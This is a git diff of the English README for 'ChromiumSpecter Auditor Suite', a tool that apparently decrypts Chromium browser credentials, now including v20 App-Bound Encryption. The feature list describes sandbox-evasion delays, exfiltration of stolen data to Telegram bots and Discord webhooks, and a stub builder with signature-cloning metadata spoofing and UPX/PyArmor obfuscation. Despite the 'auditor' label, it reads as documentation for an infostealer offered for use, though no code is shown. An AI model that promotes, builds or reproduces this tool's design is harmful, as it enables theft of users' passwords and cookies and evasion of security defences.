@@ -1,4 +1,4 @@
-# 🛡️ ChromiumSpecter Auditor Suite
+# 🛡️ ChromiumSpecter Auditor Suite `v2.0.0` (V20 Update)
 
 > [!NOTE]
 > **English Version** | [Versión en Español](README.md)
@@ -32,10 +32,10 @@
 ### 🌟 Key Features
 
 * **🖥️ High-Density Dashboard**: Professional graphical interface with real-time consoles, dynamic statistics, and result management.
-* **🔐 Dual Decryption Engine**:
-  * Simultaneous support for **AES-GCM (Chromium v80+)** and **DPAPI Legacy** in the same profile database.
-  * Per-individual blob decryption — a migrated profile can have entries of both types and they are processed correctly without discarding anything.
-  * Automatic scheme detection by prefix (`v10`/`v11`) with intelligent fallback to DPAPI if AES fails.
+* **🔐 Dual Decryption Engine (v2.0.0)**:
+  * Simultaneous support for **AES-GCM (Chromium v80+)**, **DPAPI Legacy**, and **v20 (App-Bound Encryption)** in the same profile database.
+  * Per-individual blob decryption — a migrated profile can have entries of multiple types and they are processed correctly without discarding anything.
+  * Automatic scheme detection by prefix (`v10`/`v11`/`v20`) with intelligent fallback to DPAPI if AES fails.
   * Profiles without AES key (old Chrome) continue to be processed in pure DPAPI mode.
 * **🕵️ Tactical Stealth Engine**:
   * **Startup Delay**: Initial delay selector (0-300s) to evade analysis in Sandboxes.
@@ -57,11 +57,12 @@
 * **Multi-Channel**: Native support for **Telegram Bots** and **Discord Webhooks** with redundancy.
 * **Local Persistence**: Secure saving of exfiltration configurations for recurring use.
 
-### 🛠️ Integrated Visual Builder
+### 🛠️ Integrated Visual Builder `v2.0.0`
 
-Generation of custom stubs with **Dynamic Injection** of parameters.
-**Metadata Spoofing**: Integrated presets to clone signatures.
-**Compression and Obfuscation**: Native support for UPX and PyArmor.
+* **Custom Stub Generation**: Dynamic injection of parameters.
+* **Universal Dependency Injection**: The builder now automatically parses `requirements.txt` and resolves dependencies at compile time.
+* **Metadata Spoofing**: Integrated presets to clone signatures.
+* **Compression and Obfuscation**: Native support for UPX and PyArmor.
 
 <div align="center">
   <img src="screenshots/builder.png" width="800" alt="ChromiumSpecter Builder">
